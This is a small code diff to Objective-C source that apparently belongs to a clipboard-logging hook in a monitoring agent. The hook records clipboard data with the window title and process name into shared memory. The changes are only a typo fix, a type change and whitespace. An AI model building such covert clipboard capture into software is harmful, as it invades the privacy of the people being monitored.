@@ -84,7 +84,7 @@
       _windowName = [[[[NSApplication sharedApplication] mainWindow] title] copy];
       
       if (_windowName == nil || [_windowName length] == 0) 
-        _windowName = @"unknow";
+        _windowName = @"unknown";
       
       windowName = [[NSMutableData alloc] initWithData:
                     [_windowName dataUsingEncoding:
@@ -108,7 +108,7 @@
                       length: sizeof(short)];
       
       // Delimeter
-      unsigned long del = DELIMETER;
+      uint32_t del = DELIMETER;
       [entryData appendBytes: &del
                       length: sizeof(del)];
       
@@ -128,7 +128,7 @@
       memcpy(shMemoryHeader->commandData,
              [entryData bytes],
              [entryData length]);
-    
+      
       if ([mSharedMemoryLogging writeMemory: logData
                                      offset: 0
                               fromComponent: COMP_AGENT] == TRUE)
@@ -141,7 +141,7 @@
       else
         NSLog(@"setDataHook: Error while logging clipboard to shared memory");
 #endif
-    
+      
       [_processName release];
       [entryData release];
       [dataString release];
